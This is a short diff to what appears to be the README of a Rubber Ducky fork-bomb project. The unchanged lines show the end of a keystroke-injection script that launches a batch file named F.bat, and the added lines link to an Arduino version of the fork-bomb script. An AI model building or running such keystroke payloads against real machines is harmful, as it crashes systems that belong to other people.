@@ -33,3 +33,7 @@ CONTROL z
 ENTER
 DELAY 100
 STRING start F.bat</pre></code>
+
+# Arduino code
+
+<a href="https://github.com/BlueArduino20/Fork-bomb-for-Rubber-Ducky/blob/master/fork-bomb-arduino-script.ino">Fork-bomb-arduino-script.ino</a>
